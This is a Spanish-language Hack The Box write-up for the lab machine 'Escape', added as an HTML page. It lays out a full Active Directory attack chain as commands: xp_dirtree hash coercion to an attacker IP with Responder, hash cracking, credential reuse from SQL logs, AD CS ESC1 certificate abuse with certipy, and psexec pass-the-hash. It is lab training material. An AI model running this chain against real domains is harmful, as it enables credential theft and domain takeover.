@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Escape HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/escape/pasted-image-20260310142111.png" alt="Escape HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Escape</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>MSSQL</span>
+            <span>Responder</span>
+            <span>AD CS</span>
+            <span>Certipy</span>
+            <span>ad_cs</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Share anónimo con credenciales para <code>MSSQL</code></li>
+            <li><code>Explotación</code>: <code>Responder</code> con <code>MSSQL</code> captura de un hash <code>NTLMv2</code></li>
+            <li><code>Movimiento lateral</code>: Credenciales reutilizables en logs de <code>SQL Server</code></li>
+            <li><code>Escalada de Privilegios</code>: Certificados <code>AD CS</code> mediante <code>ESC1</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/escape/pasted-image-20260310144047.png" alt="Escape HTB" />
+          <div class="code-card">
+            <h3>Share anónimo con credenciales para mssql</h3>
+            <pre><code>nxc smb 10.129.228.253 -u Guest -p &#x27;&#x27; --shares
+smbclient //dc/Public/ -U Guest -c &quot;recurse; prompt; mget *;&quot;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/escape/pasted-image-20260310143920.png" alt="Escape HTB" />
+          <img class="writeup-image" src="/writeups/assets/escape/pasted-image-20260310143855.png" alt="Escape HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Responder con MSSQL capturamos hash NTLMv2</h2>
+          <div class="code-card">
+            <h3>Acceso mssql</h3>
+            <pre><code>impacket-mssqlclient PublicUser:GuestUserCantWrite1@dc
+
+EXEC xp_dirtree &#x27;\\10.10.16.69\test&#x27;
+# Alternativas 
+EXEC MASTER.sys.xp_dirtree &#x27;\\10.10.16.69\test&#x27;
+EXEC MASTER.sys.xp_dirtree &#x27;\\10.10.16.69\test&#x27;, 1, 1</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listener</h3>
+            <pre><code>responder -I tun0 -v</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/escape/pasted-image-20260310151834.png" alt="Escape HTB" />
+          <div class="code-card">
+            <h3>Crack hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Credenciales -&gt; sql_svc:REGGIE1234ronnie</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -u sql_svc -p &#x27;REGGIE1234ronnie&#x27; -i dc</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/escape/pasted-image-20260310152140.png" alt="Escape HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Logs con credenciales expuestas</h2>
+          <div class="code-card">
+            <h3>Ver logs de sesión en slqserver</h3>
+            <pre><code>type ERRORLOG.BAK</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/escape/pasted-image-20260310162200.png" alt="Escape HTB" />
+          <img class="writeup-image" src="/writeups/assets/escape/pasted-image-20260310162820.png" alt="Escape HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -u &#x27;ryan.cooper&#x27; -p NuclearMosquito3 -i dc</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: AD CS ESC1</h2>
+          <div class="code-card">
+            <h3>Solicitar Certificado como Administrator</h3>
+            <pre><code>certipy-ad req -u &#x27;ryan.cooper&#x27;@sequel.htb -p NuclearMosquito3 -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -dc-ip 10.129.228.253</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Autenticarse con el Certificado</h3>
+            <pre><code>certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.129.228.253 
+# Hash NTLM administrator aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/escape/pasted-image-20260310164132.png" alt="Escape HTB" />
+          <div class="code-card">
+            <h3>Acceso PSEXEC</h3>
+            <pre><code>impacket-psexec administrator@dc -hashes :a52f78e4c751e5f5e17e1e9f3e58f4ee</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/escape/pasted-image-20260310164341.png" alt="Escape HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>MSSQL</span>
+            <span>Responder</span>
+            <span>AD CS</span>
+            <span>Certipy</span>
+            <span>ad_cs</span>
+            <span>esc1</span>
+            <span>ntlmv2</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
